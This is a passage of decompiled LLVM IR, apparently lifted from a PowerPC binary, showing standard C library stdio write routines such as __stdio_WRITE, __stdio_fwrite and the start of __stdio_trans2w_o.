  store i32 %v2_1000c86c, i32* %r0.global-to-local, align 4
  %v4_1000c870 = icmp eq i32 %v0_1000c870, %v2_1000c86c
  br i1 %v4_1000c870, label %dec_label_pc_1000c87c, label %dec_label_pc_1000c878

dec_label_pc_1000c878:                            ; preds = %dec_label_pc_1000c86c
  %v0_1000c878 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c878 = load i32, i32* @r4, align 4
  %v2_1000c878 = inttoptr i32 %v1_1000c878 to i32*
  store i32 %v0_1000c878, i32* %v2_1000c878, align 4
  br label %dec_label_pc_1000c87c

dec_label_pc_1000c87c:                            ; preds = %dec_label_pc_1000c86c, %dec_label_pc_1000c878
  %v0_1000c87c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c87c = load i32, i32* @r5, align 4
  %v2_1000c87c = sub i32 %v1_1000c87c, %v0_1000c87c
  store i32 %v2_1000c87c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000c880

dec_label_pc_1000c880:                            ; preds = %dec_label_pc_1000c800, %dec_label_pc_1000c87c
  %v0_1000c884 = phi i32 [ %v0_1000c884.pre, %dec_label_pc_1000c800 ], [ %v2_1000c87c, %dec_label_pc_1000c87c ]
  store i32 %v0_1000c7cc, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000c884

; uselistorder directives
  uselistorder i32 %v1_1000c868, { 1, 0 }
  uselistorder i32 %v2_1000c860, { 0, 2, 1 }
  uselistorder i32 %v1_1000c854, { 1, 0 }
  uselistorder i32 %v0_1000c838, { 2, 3, 0, 1 }
  uselistorder i32 %v2_1000c8507, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 5, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 6, 3, 5, 0, 7, 4, 8 }
  uselistorder i32 84, { 4, 5, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c880, { 1, 0 }
  uselistorder label %dec_label_pc_1000c87c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c850, { 1, 0 }
  uselistorder label %dec_label_pc_1000c82c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c820, { 2, 0, 1 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1000c894 = load i32, i32* @lr, align 4
  store i32 %v0_1000c894, i32* %r0.global-to-local, align 4
  %v0_1000c8a0 = load i32, i32* @r5, align 4
  store i32 %v0_1000c8a0, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_1000c8a0, i32* @r31, align 4
  %v3_1000c8b43 = icmp eq i32 %v0_1000c8a0, 0
  store i32 %v0_1000c8a0, i32* @r27, align 4
  br i1 %v3_1000c8b43, label %dec_label_pc_1000c95c, label %dec_label_pc_1000c8c4

dec_label_pc_1000c8c4:                            ; preds = %entry, %dec_label_pc_1000c8e4
  %v0_1000c8d4 = phi i32 [ %v2_1000c8e4, %dec_label_pc_1000c8e4 ], [ %arg2, %entry ]
  %v1_1000c8c4.in = phi i32 [ %v2_1000c8e8, %dec_label_pc_1000c8e4 ], [ %v0_1000c8a0, %entry ]
  %v1_1000c8c4 = icmp sgt i32 %v1_1000c8c4.in, 0
  br i1 %v1_1000c8c4, label %dec_label_pc_1000c8d0, label %dec_label_pc_1000c8c8

dec_label_pc_1000c8c8:                            ; preds = %dec_label_pc_1000c8c4
  br label %dec_label_pc_1000c8d0

dec_label_pc_1000c8d0:                            ; preds = %dec_label_pc_1000c8c4, %dec_label_pc_1000c8c8
  %v0_1000c8d0 = load i32, i32* @r30, align 4
  %v1_1000c8d0 = add i32 %v0_1000c8d0, 4
  %v2_1000c8d0 = inttoptr i32 %v1_1000c8d0 to i32*
  %v3_1000c8d0 = load i32, i32* %v2_1000c8d0, align 4
  store i32 268486876, i32* @lr, align 4
  %v3_1000c8d8 = call i32 @__libc_write(i32 %v3_1000c8d0, i32 %v0_1000c8d4)
  %v1_1000c8dc = icmp slt i32 %v3_1000c8d8, 0
  br i1 %v1_1000c8dc, label %dec_label_pc_1000c8f0, label %dec_label_pc_1000c8e4

dec_label_pc_1000c8e4:                            ; preds = %dec_label_pc_1000c8d0
  %v0_1000c8e4 = load i32, i32* @r29, align 4
  %v2_1000c8e4 = add i32 %v0_1000c8e4, %v3_1000c8d8
  store i32 %v2_1000c8e4, i32* @r29, align 4
  %v1_1000c8e8 = load i32, i32* @r31, align 4
  %v2_1000c8e8 = sub i32 %v1_1000c8e8, %v3_1000c8d8
  store i32 %v2_1000c8e8, i32* @r31, align 4
  %v3_1000c8b4 = icmp eq i32 %v2_1000c8e8, 0
  store i32 %v2_1000c8e8, i32* @r27, align 4
  br i1 %v3_1000c8b4, label %dec_label_pc_1000c8b4.dec_label_pc_1000c95c.loopexit_crit_edge, label %dec_label_pc_1000c8c4

dec_label_pc_1000c8f0:                            ; preds = %dec_label_pc_1000c8d0
  %v0_1000c8f0 = load i32, i32* @r30, align 4
  %v1_1000c8f0 = add i32 %v0_1000c8f0, 8
  %v2_1000c8f0 = inttoptr i32 %v1_1000c8f0 to i32*
  %v3_1000c8f0 = load i32, i32* %v2_1000c8f0, align 4
  store i32 %v3_1000c8f0, i32* %r11.global-to-local, align 4
  %v1_1000c8f4 = add i32 %v0_1000c8f0, 12
  %v2_1000c8f4 = inttoptr i32 %v1_1000c8f4 to i32*
  %v3_1000c8f4 = load i32, i32* %v2_1000c8f4, align 4
  store i32 %v3_1000c8f4, i32* %r0.global-to-local, align 4
  %v1_1000c8f8 = inttoptr i32 %v0_1000c8f0 to i16*
  %v2_1000c8f8 = load i16, i16* %v1_1000c8f8, align 2
  %v2_1000c8fc = sub i32 %v3_1000c8f4, %v3_1000c8f0
  store i32 %v2_1000c8fc, i32* %r0.global-to-local, align 4
  %v5_1000c8fc = icmp eq i32 %v2_1000c8fc, 0
  %v1_1000c900 = or i16 %v2_1000c8f8, 8
  store i16 %v1_1000c900, i16* %v1_1000c8f8, align 2
  br i1 %v5_1000c8fc, label %dec_label_pc_1000c8f0.dec_label_pc_1000c958_crit_edge, label %dec_label_pc_1000c90c

dec_label_pc_1000c8f0.dec_label_pc_1000c958_crit_edge: ; preds = %dec_label_pc_1000c8f0
  %v0_1000c958.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000c958

dec_label_pc_1000c90c:                            ; preds = %dec_label_pc_1000c8f0
  %v0_1000c90c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c90c = load i32, i32* @r31, align 4
  %v3_1000c90c = icmp ugt i32 %v0_1000c90c, %v1_1000c90c
  br i1 %v3_1000c90c, label %dec_label_pc_1000c90c.dec_label_pc_1000c918_crit_edge, label %dec_label_pc_1000c914

dec_label_pc_1000c90c.dec_label_pc_1000c918_crit_edge: ; preds = %dec_label_pc_1000c90c
  %v0_1000c918.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000c918

dec_label_pc_1000c914:                            ; preds = %dec_label_pc_1000c90c
  store i32 %v0_1000c90c, i32* @r27, align 4
  br label %dec_label_pc_1000c918

dec_label_pc_1000c918:                            ; preds = %dec_label_pc_1000c90c.dec_label_pc_1000c918_crit_edge, %dec_label_pc_1000c914
  %v0_1000c918 = phi i32 [ %v0_1000c918.pre, %dec_label_pc_1000c90c.dec_label_pc_1000c918_crit_edge ], [ %v0_1000c90c, %dec_label_pc_1000c914 ]
  store i32 %v0_1000c918, i32* %ctr.global-to-local, align 4
  %v2_1000c924.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c91c

dec_label_pc_1000c91c:                            ; preds = %dec_label_pc_1000c940, %dec_label_pc_1000c918
  %v2_1000c924 = phi i32 [ %v1_1000c940, %dec_label_pc_1000c940 ], [ %v2_1000c924.pre, %dec_label_pc_1000c918 ]
  %v0_1000c91c = load i32, i32* @r29, align 4
  %v1_1000c91c = inttoptr i32 %v0_1000c91c to i8*
  %v2_1000c91c = load i8, i8* %v1_1000c91c, align 1
  %v3_1000c91c = zext i8 %v2_1000c91c to i32
  store i32 %v3_1000c91c, i32* %r0.global-to-local, align 4
  %v1_1000c920 = add i32 %v0_1000c91c, 1
  store i32 %v1_1000c920, i32* @r29, align 4
  %v3_1000c924 = inttoptr i32 %v2_1000c924 to i8*
  store i8 %v2_1000c91c, i8* %v3_1000c924, align 1
  %v0_1000c928 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c928 = urem i32 %v0_1000c928, 256
  store i32 %v1_1000c928, i32* %r0.global-to-local, align 4
  %v3_1000c92c = icmp eq i32 %v1_1000c928, 10
  br i1 %v3_1000c92c, label %dec_label_pc_1000c934, label %dec_label_pc_1000c940

dec_label_pc_1000c934:                            ; preds = %dec_label_pc_1000c91c
  %v0_1000c934 = load i32, i32* @r30, align 4
  %v1_1000c934 = inttoptr i32 %v0_1000c934 to i16*
  %v2_1000c934 = load i16, i16* %v1_1000c934, align 2
  %v3_1000c934 = zext i16 %v2_1000c934 to i32
  store i32 %v3_1000c934, i32* %r0.global-to-local, align 4
  %v1_1000c938 = and i32 %v3_1000c934, 256
  %v3_1000c938 = icmp eq i32 %v1_1000c938, 0
  br i1 %v3_1000c938, label %dec_label_pc_1000c940, label %dec_label_pc_1000c934.dec_label_pc_1000c948_crit_edge

dec_label_pc_1000c934.dec_label_pc_1000c948_crit_edge: ; preds = %dec_label_pc_1000c934
  %v0_1000c94c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c948

dec_label_pc_1000c940:                            ; preds = %dec_label_pc_1000c934, %dec_label_pc_1000c91c
  %v0_1000c940 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c940 = add i32 %v0_1000c940, 1
  store i32 %v1_1000c940, i32* %r11.global-to-local, align 4
  %v0_1000c944 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c944 = add i32 %v0_1000c944, -1
  store i32 %v1_1000c944, i32* %ctr.global-to-local, align 4
  %v2_1000c944 = icmp eq i32 %v1_1000c944, 0
  br i1 %v2_1000c944, label %dec_label_pc_1000c940.dec_label_pc_1000c948_crit_edge, label %dec_label_pc_1000c91c

dec_label_pc_1000c940.dec_label_pc_1000c948_crit_edge: ; preds = %dec_label_pc_1000c940
  %v0_1000c948.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000c948

dec_label_pc_1000c948:                            ; preds = %dec_label_pc_1000c934.dec_label_pc_1000c948_crit_edge, %dec_label_pc_1000c940.dec_label_pc_1000c948_crit_edge
  %v0_1000c94c = phi i32 [ %v1_1000c940, %dec_label_pc_1000c940.dec_label_pc_1000c948_crit_edge ], [ %v0_1000c94c.pre, %dec_label_pc_1000c934.dec_label_pc_1000c948_crit_edge ]
  %v0_1000c948 = phi i32 [ %v0_1000c948.pre, %dec_label_pc_1000c940.dec_label_pc_1000c948_crit_edge ], [ %v0_1000c934, %dec_label_pc_1000c934.dec_label_pc_1000c948_crit_edge ]
  %v1_1000c948 = add i32 %v0_1000c948, 8
  %v2_1000c948 = inttoptr i32 %v1_1000c948 to i32*
  %v3_1000c948 = load i32, i32* %v2_1000c948, align 4
  store i32 %v3_1000c948, i32* %r0.global-to-local, align 4
  %v2_1000c94c = add i32 %v0_1000c948, 16
  %v3_1000c94c = inttoptr i32 %v2_1000c94c to i32*
  store i32 %v0_1000c94c, i32* %v3_1000c94c, align 4
  %v0_1000c950 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c950 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000c950 = sub i32 %v1_1000c950, %v0_1000c950
  store i32 %v2_1000c950, i32* %r0.global-to-local, align 4
  %v1_1000c954 = load i32, i32* @r31, align 4
  %v2_1000c954 = sub i32 %v1_1000c954, %v2_1000c950
  store i32 %v2_1000c954, i32* @r31, align 4
  br label %dec_label_pc_1000c958

dec_label_pc_1000c958:                            ; preds = %dec_label_pc_1000c8f0.dec_label_pc_1000c958_crit_edge, %dec_label_pc_1000c948
  %v0_1000c958 = phi i32 [ %v0_1000c958.pre, %dec_label_pc_1000c8f0.dec_label_pc_1000c958_crit_edge ], [ %v2_1000c954, %dec_label_pc_1000c948 ]
  %v1_1000c958 = load i32, i32* @r28, align 4
  %v2_1000c958 = sub i32 %v1_1000c958, %v0_1000c958
  store i32 %v2_1000c958, i32* @r28, align 4
  br label %dec_label_pc_1000c95c

dec_label_pc_1000c8b4.dec_label_pc_1000c95c.loopexit_crit_edge: ; preds = %dec_label_pc_1000c8e4
  %v0_1000c960.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000c95c

dec_label_pc_1000c95c:                            ; preds = %entry, %dec_label_pc_1000c8b4.dec_label_pc_1000c95c.loopexit_crit_edge, %dec_label_pc_1000c958
  %v0_1000c960 = phi i32 [ %v2_1000c958, %dec_label_pc_1000c958 ], [ %v0_1000c960.pre.pre, %dec_label_pc_1000c8b4.dec_label_pc_1000c95c.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_1000c894, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000c960

; uselistorder directives
  uselistorder i32 %v0_1000c948, { 1, 0 }
  uselistorder i32 %v1_1000c944, { 1, 0 }
  uselistorder i32 %v1_1000c940, { 0, 2, 1 }
  uselistorder i32 %v1_1000c928, { 1, 0 }
  uselistorder i32 %v2_1000c8e8, { 1, 3, 2, 0 }
  uselistorder i32 %v2_1000c8e4, { 1, 0 }
  uselistorder i32 %v3_1000c8d8, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 1, 2, 5 }
  uselistorder i32 (i32, i32)* @__libc_write, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000c95c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000c958, { 1, 0 }
  uselistorder label %dec_label_pc_1000c948, { 1, 0 }
  uselistorder label %dec_label_pc_1000c918, { 1, 0 }
  uselistorder label %dec_label_pc_1000c8d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c8c4, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_1000c974 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_1000c990 = load i16, i16* %arg3, align 2
  %v1_1000c994 = and i16 %v3_1000c990, 512
  %v3_1000c994 = icmp eq i16 %v1_1000c994, 0
  br i1 %v3_1000c994, label %dec_label_pc_1000c99c, label %dec_label_pc_1000caa8

dec_label_pc_1000c99c:                            ; preds = %entry
  %v2_1000c99c = add i32 %tmp, 4
  %v3_1000c99c = inttoptr i32 %v2_1000c99c to i32*
  %v4_1000c99c = load i32, i32* %v3_1000c99c, align 4
  %v2_1000c9a0 = add i32 %tmp, 16
  %v3_1000c9a0 = inttoptr i32 %v2_1000c9a0 to i32*
  %v4_1000c9a0 = load i32, i32* %v3_1000c9a0, align 4
  store i32 %v4_1000c9a0, i32* @r3, align 4
  %v3_1000c9a4 = icmp eq i32 %v4_1000c99c, -2
  %v2_1000c9a8 = add i32 %tmp, 12
  %v3_1000c9a8 = inttoptr i32 %v2_1000c9a8 to i32*
  %v4_1000c9a8 = load i32, i32* %v3_1000c9a8, align 4
  %v2_1000c9b0 = sub i32 %v4_1000c9a8, %v4_1000c9a0
  br i1 %v3_1000c9a4, label %dec_label_pc_1000c9b0, label %dec_label_pc_1000c9e0

dec_label_pc_1000c9b0:                            ; preds = %dec_label_pc_1000c99c
  %v3_1000c9b8 = icmp ult i32 %v2_1000c9b0, %arg2
  br i1 %v3_1000c9b8, label %dec_label_pc_1000c9c0, label %dec_label_pc_1000c9c4

dec_label_pc_1000c9c0:                            ; preds = %dec_label_pc_1000c9b0
  br label %dec_label_pc_1000c9c4

dec_label_pc_1000c9c4:                            ; preds = %dec_label_pc_1000c9b0, %dec_label_pc_1000c9c0
  %storemerge = phi i32 [ %v2_1000c9b0, %dec_label_pc_1000c9c0 ], [ %arg2, %dec_label_pc_1000c9b0 ]
  %v0_1000c9c8 = phi i32 [ %v2_1000c9b0, %dec_label_pc_1000c9c0 ], [ %arg2, %dec_label_pc_1000c9b0 ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_1000c9c8, i32* @r5, align 4
  store i32 268487120, i32* @lr, align 4
  %v0_1000c9cc = call i32 @memcpy()
  %v0_1000c9d0 = load i32, i32* @r30, align 4
  %v1_1000c9d0 = add i32 %v0_1000c9d0, 16
  %v2_1000c9d0 = inttoptr i32 %v1_1000c9d0 to i32*
  %v3_1000c9d0 = load i32, i32* %v2_1000c9d0, align 4
  %v1_1000c9d4 = load i32, i32* @r31, align 4
  %v2_1000c9d4 = add i32 %v1_1000c9d4, %v3_1000c9d0
  store i32 %v2_1000c9d4, i32* %v2_1000c9d0, align 4
  br label %dec_label_pc_1000cac8

dec_label_pc_1000c9e0:                            ; preds = %dec_label_pc_1000c99c
  %v3_1000c9e4 = icmp ult i32 %v2_1000c9b0, %arg2
  br i1 %v3_1000c9e4, label %dec_label_pc_1000ca84, label %dec_label_pc_1000c9ec

dec_label_pc_1000c9ec:                            ; preds = %dec_label_pc_1000c9e0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268487160, i32* @lr, align 4
  %v0_1000c9f4 = call i32 @memcpy()
  %v0_1000c9f8 = load i32, i32* @r30, align 4
  %v1_1000c9f8 = inttoptr i32 %v0_1000c9f8 to i16*
  %v2_1000c9f8 = load i16, i16* %v1_1000c9f8, align 2
  %v1_1000c9fc = add i32 %v0_1000c9f8, 16
  %v2_1000c9fc = inttoptr i32 %v1_1000c9fc to i32*
  %v3_1000c9fc = load i32, i32* %v2_1000c9fc, align 4
  %v1_1000ca00 = and i16 %v2_1000c9f8, 256
  %v3_1000ca00 = icmp eq i16 %v1_1000ca00, 0
  %v1_1000ca04 = load i32, i32* @r29, align 4
  %v2_1000ca04 = add i32 %v1_1000ca04, %v3_1000c9fc
  store i32 %v2_1000ca04, i32* %v2_1000c9fc, align 4
  br i1 %v3_1000ca00, label %dec_label_pc_1000cac8, label %dec_label_pc_1000ca10

dec_label_pc_1000ca10:                            ; preds = %dec_label_pc_1000c9ec
  %v0_1000ca10 = load i32, i32* @r28, align 4
  %v0_1000ca18 = load i32, i32* @r29, align 4
  store i32 268487200, i32* @lr, align 4
  %v4_1000ca1c = call i32 @memrchr(i32 %v0_1000ca10, i32 10, i32 %v0_1000ca18, i32 %v2_1000ca04)
  %v3_1000ca20 = icmp eq i32 %v4_1000ca1c, 0
  br i1 %v3_1000ca20, label %dec_label_pc_1000cac8, label %dec_label_pc_1000ca28

dec_label_pc_1000ca28:                            ; preds = %dec_label_pc_1000ca10
  %v0_1000ca28 = load i32, i32* @r30, align 4
  store i32 %v0_1000ca28, i32* @r3, align 4
  store i32 268487216, i32* @lr, align 4
  %v0_1000ca2c = call i32 @__stdio_wcommit()
  %v3_1000ca30 = icmp eq i32 %v0_1000ca2c, 0
  br i1 %v3_1000ca30, label %dec_label_pc_1000cac8, label %dec_label_pc_1000ca38

dec_label_pc_1000ca38:                            ; preds = %dec_label_pc_1000ca28
  %v0_1000ca38 = load i32, i32* @r29, align 4
  %v3_1000ca38 = icmp ugt i32 %v0_1000ca38, %v0_1000ca2c
  %v0_1000ca2c.v0_1000ca3c = select i1 %v3_1000ca38, i32 %v0_1000ca2c, i32 %v0_1000ca38
  store i32 %v0_1000ca2c.v0_1000ca3c, i32* @r31, align 4
  %v2_1000ca48 = sub i32 %v0_1000ca38, %v0_1000ca2c.v0_1000ca3c
  %v0_1000ca50 = load i32, i32* @r28, align 4
  %v2_1000ca50 = add i32 %v0_1000ca50, %v2_1000ca48
  store i32 %v2_1000ca50, i32* @r28, align 4
  store i32 %v2_1000ca50, i32* @r3, align 4
  store i32 268487264, i32* @lr, align 4
  %v3_1000ca5c = call i32 @__GI_memchr(i32 %v2_1000ca50, i32 10, i32 %v0_1000ca2c.v0_1000ca3c)
  %v3_1000ca60 = icmp eq i32 %v3_1000ca5c, 0
  br i1 %v3_1000ca60, label %dec_label_pc_1000cac8, label %dec_label_pc_1000ca68

dec_label_pc_1000ca68:                            ; preds = %dec_label_pc_1000ca38
  %v0_1000ca68 = load i32, i32* @r30, align 4
  %v1_1000ca68 = add i32 %v0_1000ca68, 16
  %v2_1000ca68 = inttoptr i32 %v1_1000ca68 to i32*
  %v3_1000ca68 = load i32, i32* %v2_1000ca68, align 4
  %v0_1000ca6c = load i32, i32* @r28, align 4
  %v1_1000ca6c = load i32, i32* @r31, align 4
  %v2_1000ca6c = sub i32 %v0_1000ca6c, %v3_1000ca5c
  %v2_1000ca70 = add i32 %v2_1000ca6c, %v1_1000ca6c
  %v2_1000ca74 = sub i32 %v3_1000ca68, %v2_1000ca70
  %v1_1000ca78 = load i32, i32* @r29, align 4
  %v2_1000ca78 = sub i32 %v1_1000ca78, %v2_1000ca70
  store i32 %v2_1000ca78, i32* @r29, align 4
  store i32 %v2_1000ca74, i32* %v2_1000ca68, align 4
  br label %dec_label_pc_1000cac8

dec_label_pc_1000ca84:                            ; preds = %dec_label_pc_1000c9e0
  %v2_1000ca84 = add i32 %tmp, 8
  %v3_1000ca84 = inttoptr i32 %v2_1000ca84 to i32*
  %v4_1000ca84 = load i32, i32* %v3_1000ca84, align 4
  %v4_1000ca88 = icmp eq i32 %v4_1000c9a0, %v4_1000ca84
  br i1 %v4_1000ca88, label %dec_label_pc_1000caa8, label %dec_label_pc_1000ca90

dec_label_pc_1000ca90:                            ; preds = %dec_label_pc_1000ca84
  store i32 %tmp, i32* @r3, align 4
  store i32 268487320, i32* @lr, align 4
  %v0_1000ca94 = call i32 @__stdio_wcommit()
  %v3_1000ca98 = icmp eq i32 %v0_1000ca94, 0
  br i1 %v3_1000ca98, label %dec_label_pc_1000ca90.dec_label_pc_1000caa8_crit_edge, label %dec_label_pc_1000caa0

dec_label_pc_1000ca90.dec_label_pc_1000caa8_crit_edge: ; preds = %dec_label_pc_1000ca90
  %v0_1000caac.pre = load i32, i32* @r30, align 4
  %v0_1000cab0.pre = load i32, i32* @r28, align 4
  %v0_1000cab4.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000caa8

dec_label_pc_1000caa0:                            ; preds = %dec_label_pc_1000ca90
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_1000cac8

dec_label_pc_1000caa8:                            ; preds = %dec_label_pc_1000ca90.dec_label_pc_1000caa8_crit_edge, %entry, %dec_label_pc_1000ca84
  %v0_1000cab4 = phi i32 [ %v0_1000cab4.pre, %dec_label_pc_1000ca90.dec_label_pc_1000caa8_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_1000ca84 ]
  %v0_1000cab0 = phi i32 [ %v0_1000cab0.pre, %dec_label_pc_1000ca90.dec_label_pc_1000caa8_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_1000ca84 ]
  %v0_1000caac = phi i32 [ %v0_1000caac.pre, %dec_label_pc_1000ca90.dec_label_pc_1000caa8_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_1000ca84 ]
  %v1_1000caac = inttoptr i32 %v0_1000caac to i16*
  store i32 %v0_1000cab4, i32* @r5, align 4
  store i32 %v0_1000c974, i32* @lr, align 4
  %v5_1000cac4 = call i32 @__stdio_WRITE(i16* %v1_1000caac, i32 %v0_1000cab0)
  br label %dec_label_pc_1000cac8

dec_label_pc_1000cac8:                            ; preds = %dec_label_pc_1000ca38, %dec_label_pc_1000ca28, %dec_label_pc_1000ca10, %dec_label_pc_1000c9ec, %dec_label_pc_1000caa0, %dec_label_pc_1000ca68, %dec_label_pc_1000c9c4, %dec_label_pc_1000caa8
  %v0_1000cacc = load i32, i32* @r29, align 4
  ret i32 %v0_1000cacc

; uselistorder directives
  uselistorder i32 %v2_1000ca70, { 1, 0 }
  uselistorder i32 %v0_1000ca2c.v0_1000ca3c, { 0, 2, 1 }
  uselistorder i32 %v0_1000ca38, { 1, 0, 2 }
  uselistorder i32 %v2_1000c9b0, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1000cac8, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_1000caa8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000c9c4, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000cae0 = load i32, i32* @lr, align 4
  store i32 %v0_1000cae0, i32* %r0.global-to-local, align 4
  %v0_1000cae8 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000caf4 = load i16, i16* %arg1, align 2
  %v4_1000caf4 = zext i16 %v3_1000caf4 to i32
  store i32 %v4_1000caf4, i32* %r0.global-to-local, align 4
  %v1_1000caf8 = load i32, i32* @r4, align 4
  %v2_1000caf8 = and i32 %v1_1000caf8, %v4_1000caf4
  store i32 %v2_1000caf8, i32* %r9.global-to-local, align 4
  %v5_1000caf8 = icmp eq i32 %v2_1000caf8, 0
  br i1 %v5_1000caf8, label %dec_label_pc_1000cb00, label %dec_label_pc_1000cb10

dec_label_pc_1000cb00:                            ; preds = %entry
  %v1_1000cb00 = and i32 %v4_1000caf4, 2176
  store i32 %v1_1000cb00, i32* %r9.global-to-local, align 4
  %v3_1000cb00 = icmp eq i32 %v1_1000cb00, 0
  br i1 %v3_1000cb00, label %dec_label_pc_1000cb08, label %dec_label_pc_1000cb1c

dec_label_pc_1000cb08:                            ; preds = %dec_label_pc_1000cb00
  %v2_1000cb08 = or i32 %v1_1000caf8, %v4_1000caf4
  store i32 %v2_1000cb08, i32* %r0.global-to-local, align 4
  %v1_1000cb0c = trunc i32 %v2_1000cb08 to i16
  store i16 %v1_1000cb0c, i16* %arg1, align 2
  %v0_1000cb10.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000cb10

dec_label_pc_1000cb10:                            ; preds = %entry, %dec_label_pc_1000cb08
  %v0_1000cb4c = phi i32 [ %tmp, %entry ], [ %v0_1000cb10.pre, %dec_label_pc_1000cb08 ]
  %v1_1000cb10 = inttoptr i32 %v0_1000cb4c to i16*
  %v2_1000cb10 = load i16, i16* %v1_1000cb10, align 2
  %v3_1000cb10 = zext i16 %v2_1000cb10 to i32
  %v1_1000cb14 = and i32 %v3_1000cb10, 32
  store i32 %v1_1000cb14, i32* %r0.global-to-local, align 4
  %v3_1000cb14 = icmp eq i32 %v1_1000cb14, 0
  br i1 %v3_1000cb14, label %dec_label_pc_1000cb3c, label %dec_label_pc_1000cb1c

dec_label_pc_1000cb1c:                            ; preds = %dec_label_pc_1000cb00, %dec_label_pc_1000cb10
  %v0_1000cb1c = call i32 @__errno_location()
  store i32 %v0_1000cb1c, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_1000cb24 = inttoptr i32 %v0_1000cb1c to i32*
  store i32 9, i32* %v2_1000cb24, align 4
  br label %dec_label_pc_1000cb28

dec_label_pc_1000cb28:                            ; preds = %dec_label_pc_1000cb64, %dec_label_pc_1000cb1c
  %v0_1000cb28 = load i32, i32* @r31, align 4
  %v1_1000cb28 = inttoptr i32 %v0_1000cb28 to i16*
  %v2_1000cb28 = load i16, i16* %v1_1000cb28, align 2
  %v3_1000cb28 = zext i16 %v2_1000cb28 to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000cb30 = or i32 %v3_1000cb28, 8
  store i32 %v1_1000cb30, i32* %r0.global-to-local, align 4
  %v1_1000cb34 = trunc i32 %v1_1000cb30 to i16
  store i16 %v1_1000cb34, i16* %v1_1000cb28, align 2
  br label %dec_label_pc_1000cbc4

dec_label_pc_1000cb3c:                            ; preds = %dec_label_pc_1000cb10
  %tmp8 = urem i16 %v2_1000cb10, 4
  %v1_1000cb3c = zext i16 %tmp8 to i32
  store i32 %v1_1000cb3c, i32* %r0.global-to-local, align 4
  %v3_1000cb3c = icmp eq i16 %tmp8, 0
  br i1 %v3_1000cb3c, label %dec_label_pc_1000cba0, label %dec_label_pc_1000cb44

dec_label_pc_1000cb44:                            ; preds = %dec_label_pc_1000cb3c
  %v1_1000cb44 = and i32 %v3_1000cb10, 4
  store i32 %v1_1000cb44, i32* %r9.global-to-local, align 4
  %v3_1000cb44 = icmp eq i32 %v1_1000cb44, 0
  br i1 %v3_1000cb44, label %dec_label_pc_1000cb4c, label %dec_label_pc_1000cb84

dec_label_pc_1000cb4c:                            ; preds = %dec_label_pc_1000cb44
  %v1_1000cb4c = add i32 %v0_1000cb4c, 20
  %v2_1000cb4c = inttoptr i32 %v1_1000cb4c to i32*
  %v3_1000cb4c = load i32, i32* %v2_1000cb4c, align 4
  store i32 %v3_1000cb4c, i32* %r0.global-to-local, align 4
